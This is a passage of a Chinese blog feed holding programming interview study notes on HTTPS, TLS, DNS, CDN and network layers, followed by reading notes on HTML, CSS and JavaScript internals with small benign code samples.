协议构建的可进行加密传输、身份认证的网络协议，比 HTTP 协议<strong>安全</strong>。</p></li><li><p>HTTPS <strong>对搜索引擎更友好</strong>，利于SEO，谷歌、百度优先索引 HTTPS 网页。</p></li><li><p>HTTP 连接建立相对简单， TCP 三次握手之后便可进行 HTTP 的报文传输。而 HTTPS 在  TCP 三次握手之后，还需进行 SSL/TLS 的握手过程，才可进入加密报文传输。</p></li><li><p>HTTPS 标准端口443，HTTP 标准端口80。</p></li><li><p>HTTPS 协议需要向 CA（证书权威机构）申请数字证书，来保证服务器的身份是可信的。</p></li></ul><p>记住以下两点HTTPS主要作用就行：</p><ul><li>对数据进行加密，并建立一个信息安全通道，来保证传输过程中的数据安全;</li><li>对网站服务器进行真实身份认证。</li></ul><h2 id="混合加密机制（HTTPS采用的方式）（高频）"><a href="#混合加密机制（HTTPS采用的方式）（高频）" class="headerlink" title="混合加密机制（HTTPS采用的方式）（高频）"></a>混合加密机制（HTTPS采用的方式）（高频）</h2><p>结合两种加密方式的优点，在<strong>交换密钥环节</strong>使用<strong>非对称加密</strong>方式，之后的<strong>建立通信交换报文阶段</strong>使用<strong>对称加密</strong>方式。</p><p><strong>对称加密：</strong>加密和解密用同一个秘钥，Client 客户端和 Server 端共用一套密钥。</p><p><strong>非对称加密：</strong>采用 RSA 算法。需要明确的点：</p><ul><li>有一对秘钥，公钥和私钥。</li><li>公钥加密的内容，只有同为一对的私钥可以解开，私钥加密的内容，所有的公钥都可以解开。</li><li>公钥可以发送给所有的客户端，私钥只保存在服务器端。</li></ul><h3 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h3><p><img src="https://i.loli.net/2021/10/15/Fj5VNrXI9bcKYa4.png" alt="image.png"></p><ol><li><p>Client 发起一个 HTTPS 请求，连接443端口。（请求公钥的过程）</p></li><li><p>Server 端收到请求后，通过第三方机构私钥加密，会把数字证书（公钥证书）发送给 Client。</p></li><li><ul><li>浏览器安装后会自动带一些权威第三方机构公钥，使用匹配的公钥对数字签名进行解密。</li><li>根据签名生成的规则对网站信息进行本地签名生成，然后两者比对。</li><li>通过比对两者签名，匹配则说明认证通过，不匹配则获取证书失败。</li></ul></li><li><p>在安全拿到服务器公钥后，客户端 Client 随机生成一个对称密钥，使用服务器公钥（证书的公钥）加密这个对称密钥，发送给 Server (服务器)。</p></li><li><p>Server (服务器)通过自己的私钥，对信息解密，至此得到了对称密钥，此时两者都拥有了相同的对称密钥。</p></li><li><p>接下来就可以通过该对称密钥对传输的信息加密/解密。</p></li></ol><p>以上图为例：</p><ul><li>Client 用户使用该对称密钥加密’明文内容 B ‘，发送给 Server (服务器)</li><li>Server 使用该对称密钥进行解密消息，得到明文内容 B。</li></ul><p><strong>如果公钥被中间人拿到纂改怎么办？</strong></p><p>第三方认证。 在HTTPS中，通过证书 + 数字签名来解决这个问题。</p><h3 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h3><p><img src="https://i.loli.net/2021/10/15/Z21UHakmL34tPKy.png" alt="image.png"></p><p>数字签名：将网站的信息，通过特定的算法加密，比如MD5。加密之后再通过服务器的私钥进行加密，形成加密后的数字签名。</p><h3 id="数字证书流程"><a href="#数字证书流程" class="headerlink" title="数字证书流程"></a>数字证书流程</h3><p><img src="https://i.loli.net/2021/10/15/5qSuMH38pKLTBJD.png" alt="image.png"></p><h2 id="SSL-TLS"><a href="#SSL-TLS" class="headerlink" title="SSL/TLS"></a>SSL/TLS</h2><p>SSL 即安全套接层，在 OSI 七层模型中处于会话层(第 5 层)。SSL 出过三个大版本，当它发展到第三个大版本的时候才被标准化，成为 TLS（传输层安全），并被当做 TLS1.0 的版本（TLS1.0 = SSL3.1）</p><h3 id="SSL-连接断开后如何恢复？"><a href="#SSL-连接断开后如何恢复？" class="headerlink" title="SSL 连接断开后如何恢复？"></a>SSL 连接断开后如何恢复？</h3><ul><li><p><strong>通过 session ID</strong>：每一次的会话都有一个编号，当对话中断后，下一次重新连接时，只要客户端给出这个编号，服务器如果有这个编号的记录，那么双方就可以继续使用以前的秘钥，而不用重新生成一把。目前所有的浏览器都支持这一种方法。</p><p><strong>缺点</strong>是 session ID 只能够存在一台服务器上，如果我们的请求通过负载平衡被转移到了其他的服务器上，那么就无法恢复对话。</p></li><li><p><strong>通过 session ticket</strong>：session ticket 是服务器在上一次对话中发送给客户的，这个 ticket 是加密的，只有服务器能够解密，里面包含了本次会话的信息，比如对话秘钥和加密方法等。这样不管我们的请求是否转移到其他的服务器上，当服务器将 ticket 解密以后，就能够获取上次对话的信息，不用重新生成对话秘钥。</p></li></ul><h3 id="主流TLS1-2版本的握手过程"><a href="#主流TLS1-2版本的握手过程" class="headerlink" title="主流TLS1.2版本的握手过程"></a>主流TLS1.2版本的握手过程</h3><p><img src="https://i.loli.net/2021/10/15/CgHpLSUO4dkeFGz.png" alt="image.png"></p><h2 id="概述一下DNS协议"><a href="#概述一下DNS协议" class="headerlink" title="概述一下DNS协议"></a>概述一下DNS协议</h2><p>DNS 域名系统，是应用层协议，运行 UDP 协议之上，使用端口 53。</p><p>作用： <strong>将域名解析为 IP 地址</strong>，客户端向 DNS 服务器发送域名查询请求，DNS 服务器告知客户机 Web 服务器的IP 地址。</p><p>DNS 缓存：在一个请求中，当某个 DNS 服务器收到一个 DNS 回答后，信息缓存在本地存储器中。（返回的资源记录中的 TTL 代表了该条记录的缓存的时间）</p><h3 id="递归查询"><a href="#递归查询" class="headerlink" title="递归查询"></a>递归查询</h3><p><img src="C:\Users\青山\AppData\Roaming\Typora\typora-user-images\image-20211015113911006.png" alt="image-20211015113911006"></p><p>递归查询指的是查询请求发出后，域名服务器代为向下一级域名服务器发出请求，最后向用户返回查询的最终结果。使用递归查询，用户只需要发出<strong>一次</strong>查询请求。</p><h3 id="迭代查询"><a href="#迭代查询" class="headerlink" title="迭代查询"></a>迭代查询</h3><p><img src="https://i.loli.net/2021/10/15/lIexFi4XOnPhDpL.png" alt="image.png"></p><p>迭代查询指的是查询请求后，域名服务器返回单次查询的结果。下一级的查询由用户自己请求。使用迭代查询，用户需要发出<strong>多次</strong>的查询请求。</p><p><strong>本地服务器查询是递归查询，而本地 DNS 服务器向其他域名服务器请求的过程是迭代查询。</strong></p><h3 id="DNS-同时使用-TCP-和-UDP-协议"><a href="#DNS-同时使用-TCP-和-UDP-协议" class="headerlink" title="DNS 同时使用 TCP 和 UDP 协议"></a>DNS 同时使用 TCP 和 UDP 协议</h3><p>DNS 占用 53 号端口，同时使用 TCP 和 UDP 协议。</p><ul><li>在<strong>区域传输</strong>的时候使用 TCP 协议：辅域名服务器会定时向主域名服务器进行查询以便了解数据是否有变动。如有变动，会执行一次区域传送，进行数据同步。区域传送使用 TCP 而不是 UDP ，因为数据同步传送的数据量比一个请求应答的数据量要多得多，且可靠。</li><li>在<strong>域名解析</strong>的时候使用 UDP 协议：客户端向DNS服务器查询域名，一般返回的内容都不超过512字节，用 UDP 传输即可。不用经过三次握手，这样DNS服务器负载更低，响应更快。</li></ul><h4 id="DNS-为什么使用-UDP-作为传输层协议？"><a href="#DNS-为什么使用-UDP-作为传输层协议？" class="headerlink" title="DNS 为什么使用 UDP 作为传输层协议？"></a>DNS 为什么使用 UDP 作为传输层协议？</h4><p>主要原因是<strong>为了避免使用 TCP 协议时造成的连接时延</strong>。</p><p>为了得到一个域名的 IP 地址，往往会向多个域名服务器查询，如果使用 TCP 协议，那么每次请求都会存在连接时延，这样使 DNS 服务变得很慢。</p><p>而大多数的地址查询请求，都是浏览器请求页面时发出的，这样会造成网页的等待时间过长。</p><h3 id="DNS-记录和报文"><a href="#DNS-记录和报文" class="headerlink" title="DNS 记录和报文"></a>DNS 记录和报文</h3><p>DNS 服务器中以资源记录的形式存储信息，每一个 DNS 响应报文一般包含多条资源记录。一条资源记录的具体的格式为<code>（Name，Value，Type，TTL）</code>。TTL 是资源记录的生存时间，它定义了资源记录能够被其他的 DNS 服务器缓存多长时间。四种 Type 的值，对应资源记录代表的意义如下：</p><ul><li>Type = A，则 Name 是主机名，Value 是主机名对应的 IP 地址。因此一条记录为 A 的资源记录，提供了标准的主机名到 IP 地址的映射。</li><li>Type = NS，则 Name 是个域名，Value 是负责该域名的 DNS 服务器的主机名。这个记录主要用于 DNS 链式 查询时，返回下一级需要查询的 DNS 服务器的信息。</li><li>Type = CNAME，则 Name 为别名，Value 为该主机的规范主机名。该条记录用于向查询的主机返回一个主机名对应的规范主机名，从而告诉查询主机去查询这个主机名的 IP 地址。</li><li>Type = MX，则 Name 为一个邮件服务器的别名，Value 为邮件服务器的规范主机名。它的作用和 CNAME 是一 样的，都是为了解决规范主机名不利于记忆的缺点。</li></ul><h3 id="DNS完整的查询过程"><a href="#DNS完整的查询过程" class="headerlink" title="DNS完整的查询过程"></a>DNS完整的查询过程</h3><ol><li><p>首先会在浏览器的缓存中查找对应的 IP 地址，如果找到就直接返回，若找不到继续下一步</p></li><li><p>将请求发送给本地 DNS 服务器，在本地域名服务器缓存中查询，如果找到，就直接将查找结果返回，若找不到继续下一步</p></li><li><p>本地 DNS 服务器向<strong>根域名</strong>服务器发送请求，根域名服务器会返回一个所查询域的顶级域名服务器地址</p></li><li><p>本地 DNS 服务器向<strong>顶级域名</strong>服务器发送请求，接受请求的服务器查询自己的缓存，如果有记录，就返回查询结果，如果没有就返回相关的下一级的权威域名服务器的地址</p></li><li><p>本地 DNS 服务器向<strong>权威域名</strong>服务器发送请求，域名服务器返回对应的结果</p></li><li><p>本地 DNS 服务器将返回结果保存在缓存中，便于下次使用</p></li><li><p>本地 DNS 服务器将返回结果返回给浏览器</p></li></ol><h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>CDN（Content Delivery Network，<strong>内容分发网络</strong>）是指一种通过互联网互相连接的电脑网络系统，<strong>利用最靠近每位用户的服务器</strong>，更快、更可靠地将音乐、图片、视频、应用程序及其他文件发送给用户，来提供高性能、可扩展性及低成本的网络内容传递给用户。</p><p>CDN 是将<strong>源站内容分发至最接近用户的节点</strong>，使用户可就近取得所需内容，提高用户访问的响应速度和成功率。解决因分布、带宽、服务器性能带来的访问延迟问题，适用于站点加速、点播、直播等场景。</p><h3 id="工作过程"><a href="#工作过程" class="headerlink" title="工作过程"></a>工作过程</h3><p>参考自 <a href="https://juejin.cn/post/6892994632968306702">https://juejin.cn/post/6892994632968306702</a></p><ol><li>浏览器要将域名解析为 IP 地址，所以需要向本地 DNS 发出请求。</li><li>本地 DNS 依次向根服务器、顶级域名服务器、权限服务器发出请求，得到全局负载均衡系统（GSLB）的 IP 地址。</li><li>本地 DNS 再向 GSLB 发出请求，GSLB 的主要功能是根据本地 DNS 的 IP 地址判断用户的位置，筛选出距离用户较近的本地负载均衡系统（SLB），并将该 SLB 的 IP 地址作为结果返回给本地 DNS。</li><li>本地 DNS 将 SLB 的 IP 地址发回给浏览器，浏览器向 SLB 发出请求。</li><li>SLB 根据浏览器请求的资源和地址，选出最优的缓存服务器发回给浏览器。</li><li>浏览器再根据 SLB 发回的地址重定向到缓存服务器。</li><li>如果缓存服务器有浏览器需要的资源，就将资源发回给浏览器。如果没有，就向源服务器请求资源，再发给浏览器并缓存在本地。</li></ol><p><img src="https://i.loli.net/2021/11/05/qYAMIuiOUZrJkpX.png" alt="image.png"></p><h2 id="OSI-七层模型和-TCP-IP-四层模型（高频）"><a href="#OSI-七层模型和-TCP-IP-四层模型（高频）" class="headerlink" title="OSI 七层模型和 TCP/IP 四层模型（高频）"></a>OSI 七层模型和 TCP/IP 四层模型（高频）</h2><ol><li>应用层（HTTP）</li><li>表示层</li><li>会话层</li><li>传输层（TCP、UDP）</li><li>网络层（IP）</li><li>数据链路层</li><li>物理层</li></ol><p><strong>TCP/IP 四层概念：</strong></p><ol><li>应用层：应用层、表示层、会话层：TELNET、FTP、SMTP、HTTP</li><li>传输层：传输层：TCP / UDP </li><li>网际层：网络层：IP</li><li>网络接口层：数据链路层、物理层</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本文是作者在学习计网，准备实习面试时整理的笔记，参考自掘金上已经整理好的博客：&lt;a href=&quot;https://juejin.cn/post</summary>
      
    
    
    
    <category term="面试准备" scheme="https://asura1211.github.io/categories/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/"/>
    
    
    <category term="计算机网络" scheme="https://asura1211.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>【阅读笔记】— — 重学前端（极客时间）</title>
    <link href="https://asura1211.github.io/2021/10/06/%E3%80%90%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E3%80%91%E2%80%94%20%E2%80%94%20%E9%87%8D%E5%AD%A6%E5%89%8D%E7%AB%AF%EF%BC%88%E6%9E%81%E5%AE%A2%E6%97%B6%E9%97%B4%EF%BC%89/"/>
    <id>https://asura1211.github.io/2021/10/06/%E3%80%90%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E3%80%91%E2%80%94%20%E2%80%94%20%E9%87%8D%E5%AD%A6%E5%89%8D%E7%AB%AF%EF%BC%88%E6%9E%81%E5%AE%A2%E6%97%B6%E9%97%B4%EF%BC%89/</id>
    <published>2021-10-06T20:49:27.000Z</published>
    <updated>2021-11-20T08:41:31.010Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>没有了超链接的 HTML，最多可以称为富文本，没法称作超文本（hyper text）。</p><p>链接是 HTML 中的一种机制，它是 HTML 文档和其它文档或者资源的连接关系，在 HTML 中，链接有两种类型。一种是超链接型标签，一种是外部资源链接。</p><p> a 标签、area 标签和 link 标签</p><h2 id="替换型元素"><a href="#替换型元素" class="headerlink" title="替换型元素"></a>替换型元素</h2><p>替换型元素是把文件的内容引入，替换掉自身位置的一类标签。凡是替换型元素，都是使用 src 属性来引用文件的。</p><p>script 标签、img 标签、video 标签</p><h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><h2 id="规则"><a href="#规则" class="headerlink" title="@规则"></a>@规则</h2><ul><li><p>@charset ：用于提示 CSS 文件使用的字符编码方式，它如果被使用，必须出现在最前面。这个规则只在给出语法解析阶段前使用，并不影响页面上的展示效果。</p></li><li><p>@import ：用于引入一个 CSS 文件。</p></li><li><p>@media ：media query 使用的规则，它能够对设备的类型进行一些判断。</p></li><li><p>@page ：用于分页媒体访问网页时的表现设置，页面是一种特殊的盒模型结构，除了页面本身，还可以设置它周围的盒。</p></li><li><p>@counter-style ：产生一种数据，用于定义列表项的表现。</p></li><li><p>@keyframes ：产生一种数据，用于定义动画关键帧。</p></li><li><p>@fontface ：用于定义一种字体，icon font 技术就是利用这个特性来实现的。</p></li><li><p>@supports ：检查环境的特性，它与 media 比较类似。</p></li><li><p>@namespace ：用于跟 XML 命名空间配合的一个规则，表示内部的 CSS 选择器全都带上特定命名空间。</p></li><li><p>@ viewport：用于设置视口的一些特性，不过兼容性目前不是很好，多数时候被 html 的 meta 代替。</p></li></ul><h2 id="声明：属性和值"><a href="#声明：属性和值" class="headerlink" title="声明：属性和值"></a>声明：属性和值</h2><p>CSS 属性值可能是以下类型。</p><ul><li>CSS 范围的关键字：initial，unset，inherit，任何属性都可以的关键字。</li><li>字符串：比如 content 属性。</li><li>URL：使用 url() 函数的 URL 值。</li><li>整数 / 实数：比如 flex 属性。</li><li>维度：单位的整数 / 实数，比如 width 属性。</li><li>百分比：大部分维度都支持。</li><li>颜色：比如 background-color 属性。</li><li>图片：比如 background-image 属性。</li><li>2D 位置：比如 background-position 属性。</li><li>函数：来自函数的值，比如 transform 属性。</li></ul><p>CSS 支持一批特定的计算型函数：</p><ul><li><p>calc()：基本的表达式计算，它支持加减乘除四则运算。在针对维度进行计算时，calc() 函数允许不同单位混合运算，这非常的有用。</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">section</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="built_in">calc</span>(<span class="number">100%</span>/<span class="number">3</span> - <span class="number">2</span>*<span class="number">1em</span> - <span class="number">2</span>*<span class="number">1px</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>max()</p></li><li><p>min()</p></li><li><p>clamp()：给一个值限定一个范围，超出范围外则使用范围的最大或者最小值。</p></li><li><p>toggle()：在规则选中多于一个元素时生效，它会在几个值之间来回切换，比如我们要让一个列表项的样式圆点和方点间隔出现，可以使用下面代码：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="selector-tag">ul</span> &#123; <span class="attribute">list-style-type</span>: <span class="built_in">toggle</span>(circle, square); &#125;</span><br></pre></td></tr></table></figure></li><li><p>attr()：允许 CSS 接受属性值的控制。</p></li></ul><h2 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h2><p>选择器连接方式的优先级：</p><ul><li>第一优先级<ul><li>无连接符号</li></ul></li><li>第二优先级<ul><li>“空格”。后代，表示选中所有符合条件的后代节点。</li><li>“~”。子代，表示选中符合条件的子节点。</li><li>“+”。直接后继，表示选中符合条件的直接后继节点，即 nextSlibling。</li><li>“&gt;”。后继，表示选中所有符合条件的后继节点。</li><li>“||”。列选择器，表示选中对应列中符合条件的单元格。</li></ul></li><li>第三优先级<ul><li>“,”</li></ul></li></ul><p>如 <code>.c,.a&gt;.b.d &#123;&#125;</code> 应该理解为这样的结构。</p><ul><li>.c,.a&gt;.b.d<ul><li>.c</li><li>.a&gt;.b.d<ul><li>.a</li><li>.b.d（表示选中的元素必须同时具有 b 和 d 两个 class）<ul><li>.b</li><li>.d</li></ul></li></ul></li></ul></li></ul><h3 id="伪元素"><a href="#伪元素" class="headerlink" title="伪元素"></a>伪元素</h3><ul><li>::first-line。CSS 标准规定了 first-line 必须出现在最内层的块级元素之内。</li><li>::first-letter</li><li>::before。在元素内容之前插入一个虚拟的元素。这两个伪元素所在的 CSS 规则<strong>必须指定 content 属性</strong>才会生效。</li><li>::after</li></ul><h2 id="正常流"><a href="#正常流" class="headerlink" title="正常流"></a>正常流</h2><p>正常流的排版行为：依次排列，排不下了换行。</p><p>正常流的原理：在 CSS 标准中，规定了如何排布每一个文字或者盒的算法，这个算法依赖一个排版的“当前状态”，CSS 把这个当前状态称为“格式化上下文（formatting context）”。</p><p><strong>格式化上下文 + 盒 / 文字 = 位置</strong></p><p>需要排版的盒，是分为块级盒和行内级盒的，所以排版需要分别为它们规定了块级格式化上下文和行内级格式化上下文。当我们要把正常流中的一个盒或者文字排版，需要分成三种情况处理：</p><ul><li><strong>当遇到块级盒</strong>：排入块级格式化上下文。</li><li><strong>当遇到行内级盒或者文字</strong>：首先尝试排入行内级格式化上下文，如果排不下，那么创建一个行盒，先将行盒排版（行盒是块级，所以到第一种情况），行盒会创建一个行内级格式化上下文。</li><li><strong>遇到 float 盒</strong>：把盒的顶部跟当前行内级上下文上边缘对齐，然后根据 float 的方向把盒的对应边缘对到块级格式化上下文的边缘，之后重排当前行盒。</li></ul><p>但是页面中的布局没有那么简单，一些元素会在其内部创建新的块级格式化上下文，这些元素有：</p><ol><li>浮动元素；</li><li>绝对定位元素；</li><li>非块级但仍能包含块级元素的容器（如 inline-blocks, table-cells, table-captions）；</li><li>块级的能包含块级元素的容器，且属性 overflow 不为 visible。</li></ol><h2 id="Flex-排版"><a href="#Flex-排版" class="headerlink" title="Flex 排版"></a>Flex 排版</h2><p>具有 display:flex 的元素称为 flex 容器，它的子元素或者盒被称作 flex 项。flex 项如果有 flex 属性，会根据 flex 方向代替宽 / 高属性，形成“填补剩余尺寸”的特性。</p><p>Flex 延伸的方向称为“主轴”，把跟它垂直的方向称为“交叉轴”。</p><h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><h2 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h2><h3 id="事件循环"><a href="#事件循环" class="headerlink" title="事件循环"></a>事件循环</h3><p>Promise里的代码为什么比setTimeout先执行？</p><p>首先，一个 JavaScript 引擎会常驻于内存中，它等待着我们（宿主）把 JavaScript 代码或者函数传递给它执行。在 ES5 之后，JavaScript 引入了 Promise。把宿主发起的任务称为<strong>宏观任务</strong>，把 JavaScript 引擎发起的任务称为<strong>微观任务</strong>。</p><p>JavaScript 引擎等待宿主环境分配宏观任务，把这一部分称为事件循环。大概可以理解为：宏观任务的队列就相当于事件循环。在宏观任务中，JavaScript 的 Promise 还会产生异步代码，JavaScript 必须保证这些异步代码在一个宏观任务中完成，因此，每个宏观任务中又包含了一个微观任务队列</p><p>实现 JS 引擎级和宿主级的任务时：Promise 永远在队列尾部添加微观任务。setTimeout 等宿主 API，则会添加宏观任务。</p><p>异步执行的顺序：</p><ul><li>首先我们分析有多少个宏任务；</li><li>在每个宏任务中，分析有多少个微任务；</li><li>根据调用次序，确定宏任务中的微任务执行次序；</li><li>根据宏任务的触发规则和调用次序，确定宏任务的执行次序；</li><li>确定整个顺序。</li></ul><h3 id="闭包和执行上下文"><a href="#闭包和执行上下文" class="headerlink" title="闭包和执行上下文"></a>闭包和执行上下文</h3><p>简单理解，闭包其实只是一个绑定了执行环境的函数。闭包包含两个部分：</p><ul><li>环境部分<ul><li>环境：函数的词法环境（执行上下文的一部分）</li><li>标识符列表：函数中用到的未声明的变量</li></ul></li><li>表达式部分：函数体</li></ul><p>JavaScript 标准把一段代码（包括函数），执行所需的所有信息定义为：“执行上下文”。</p><p><strong>执行上下文在 ES3 中</strong>，包含三个部分。</p><ul><li>scope：作用域，也常常被叫做作用域链。</li><li>variable object：变量对象，用于存储变量的对象。</li><li>this value：this 值。</li></ul><p><strong>在 ES5 中</strong>：</p><ul><li>lexical environment：词法环境，当获取变量时使用。</li><li>variable environment：变量环境，当声明变量时使用。</li><li>this value：this 值。</li></ul><p><strong>在 ES2018 中</strong>，this 值被归入 lexical environment。</p><ul><li>lexical environment：词法环境，当获取变量或者 this 值时使用。</li><li>variable environment：变量环境，当声明变量时使用</li><li>code evaluation state：用于恢复代码执行位置。</li><li>Function：执行的任务是函数时使用，表示正在被执行的函数。</li><li>ScriptOrModule：执行的任务是脚本或者模块时使用，表示正在被执行的代码。</li><li>Realm：使用的基础库和内置对象实例。</li><li>Generator：仅生成器上下文有这个属性，表示当前生成器。</li></ul><p>会产生 let 使用的作用域：</p><ul><li>for；</li><li>if；</li><li>switch；</li><li>try/catch/finally。</li></ul><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>1、普通函数：用 function 关键字定义的函数</p><p>2、箭头函数：用 =&gt; 运算符定义的函数</p><p>3、方法：在 class 中定义的函数</p><p>4、生成器函数：用 function * 定义的函数。</p><p>5、类：用 class 定义的类，实际上也是函数。</p><p>6、异步函数：普通函数、箭头函数和生成器函数加上 async 关键字。</p><h3 id="this"><a href="#this" class="headerlink" title="this"></a>this</h3><p>this 是执行上下文中很重要的一个组成部分。同一个函数调用方式不同，得到的 this 值也不同。</p><p>定义：<strong>调用函数时使用的引用，决定了函数执行时刻的 this 值。</strong></p><p>原理：<strong>我们获取函数的表达式，它实际上返回的并非函数本身，而是一个 Reference 类型。</strong>Reference 类型由两部分组成：一个对象和一个属性值。当做一些算术运算时，Reference 类型会被解引用，获取真正的值来参与运算，而类似函数调用、delete 等操作，都需要用到 Reference 类型中的对象。（如 Reference 类型中的对象被当作 this 值，传入了执行函数时的上下文）</p><p>但箭头函数不论用什么引用来调用它，都不影响它的 this 值。</p><p>JavaScript 标准定义了 [[thisMode]] 私有属性，它有三个取值：</p><p>[[thisMode]] 私有属性有三个取值。</p><ul><li>lexical：表示从上下文中找 this，对应箭头函数。</li><li>global：表示当 this 为 undefined 时，取全局对象，对应普通函数。</li><li>strict：当严格模式时使用，this 严格按照调用时传入的值，可能为 null 或者 undefined。</li></ul><h3 id="语句"><a href="#语句" class="headerlink" title="语句"></a>语句</h3><p>try里面放return，finally还会执行吗？</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line"> </span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">console</span>.log(foo()); </span><br><span class="line"><span class="comment">// a</span></span><br><span class="line"><span class="comment">// 0</span></span><br></pre></td></tr></table></figure><p>finally 确实执行了，而且 return 语句也生效了，foo() 返回了结果 0。</p><p>如果在 finally 中加入 return 语句，这会覆盖 try 中的 return。</p><p><strong>这背后有一套机制在运作，这一机制的基础正是 JavaScript 语句执行的完成状态，我们用一个标准类型来表示：Completion Record。</strong>Completion Record 表示一个语句执行完之后的结果，它有三个字段：</p><ul><li>[[type]] 表示完成的类型，有 break continue return throw 和 normal 几种类型；</li><li>[[value]] 表示语句的返回值，如果语句没有，则是 empty；</li><li>[[target]] 表示语句的目标，通常是一个 JavaScript 标签。</li></ul><p>语句的分类：</p><p><img src="https://i.loli.net/2021/10/08/AcLRijXWtOCmvs6.png" alt="image.png"></p><p>1、普通的语句：不带控制能力的语句。普通语句执行后，会得到 [[type]] 为 normal 的 Completion Record，JavaScript 引擎遇到这样的 Completion Record，会继续执行下一条语句。这些语句中，只有表达式语句会产生 [[value]]。（Chrome 控制台显示的正是语句的 Completion Record 的 [[value]]。）</p><p>2、语句块：拿大括号括起来的一组语句，它是一种语句的复合结构，可以嵌套。语句块内部语句的 Completion Record 的 [[type]] 如果不为 normal，会打断语句块后续的语句执行。</p><p>return 语句可能产生 return 或者 throw 类型的 Completion Record。下面是一个内部为普通语句的语句块：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 语句的 Completion Record([[type]] [[value]] [[target]]) 见注释</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">var</span> i = <span class="number">1</span>; <span class="comment">// normal, empty, empty</span></span><br><span class="line">  i ++; <span class="comment">// normal, 1, empty</span></span><br><span class="line">  <span class="built_in">console</span>.log(i) <span class="comment">//normal, undefined, empty</span></span><br><span class="line">&#125; <span class="comment">// normal, undefined, empty</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果加入 return </span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">var</span> i = <span class="number">1</span>; <span class="comment">// normal, empty, empty</span></span><br><span class="line">  <span class="keyword">return</span> i; <span class="comment">// return, 1, empty</span></span><br><span class="line">  i ++; </span><br><span class="line">  <span class="built_in">console</span>.log(i)</span><br><span class="line">&#125; <span class="comment">// return, 1, empty</span></span><br></pre></td></tr></table></figure><p>这个结构保证了非 normal 的完成类型可以穿透复杂的语句嵌套结构，产生控制效果。</p><p>3、控制型语句：带有 if、switch 关键字，它们会对不同类型的 Completion Record 产生反应。</p><p>控制类语句分成两部分，一类是对其内部造成影响，如 if、switch、while/for、try。另一类是对外部造成影响如 break、continue、return、throw，这两类语句的配合，会产生控制代码执行顺序和执行逻辑的效果。</p><p><img src="https://i.loli.net/2021/10/08/ogYhf6JDtXQE8bH.png" alt="image.png"></p><ul><li>消费指在这一层就执行了代码</li><li>穿透指去上一层的作用域或者控制语句找可以消费 break，continue 的执行环境</li></ul><p>4、带标签的语句：最后一个字段：target 涉及了 JavaScript 中的带标签的语句。任何 JavaScript 语句是可以加标签的，在语句前加冒号即可：<code>firstStatement: var i = 1;</code> 这个东西唯一有作用的时候是：与完成记录类型中的 target 相配合，用于跳出多层循环。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">outer: <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="attr">inner</span>: <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="keyword">break</span> outer;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;finished&quot;</span>)</span><br></pre></td></tr></table></figure><p>break/continue 语句如果后跟了关键字，会产生带 target 的完成记录。一旦完成记录带了 target，那么只有拥有对应 label 的循环语句会消费它。</p><h3 id="词法"><a href="#词法" class="headerlink" title="词法"></a>词法</h3><p><strong>为什么12.toString会报错？</strong></p><p>因为 JS里面的<code>. </code>是拥有两种含义的 一种是小数点 一种是方法调用。12.toString() 无法分辨是想要创建一个小数位为 toString() 的数，还是创建一个12 然后调用 toString()。</p><p>所以正常的写法是 <code>12..toString()</code></p><p>词法规定了语言的最小语义单元：token。JavaScript 源代码中的输入可以这样分类：</p><ul><li>WhiteSpace 空白字符</li><li>LineTerminator 换行符</li><li>Comment 注释</li><li>Token 词<ul><li>IdentifierName 标识符名称，典型案例是我们使用的变量名，注意这里关键字也包含在内了。</li><li>Punctuator 符号，我们使用的运算符和大括号等符号。</li><li>NumericLiteral 数字直接量，就是我们写的数字。</li><li>StringLiteral 字符串直接量，就是我们用单引号或者双引号引起来的直接量。</li><li>Template 字符串模板，用反引号 ` 括起来的直接量。</li></ul></li></ul><p>JavaScript 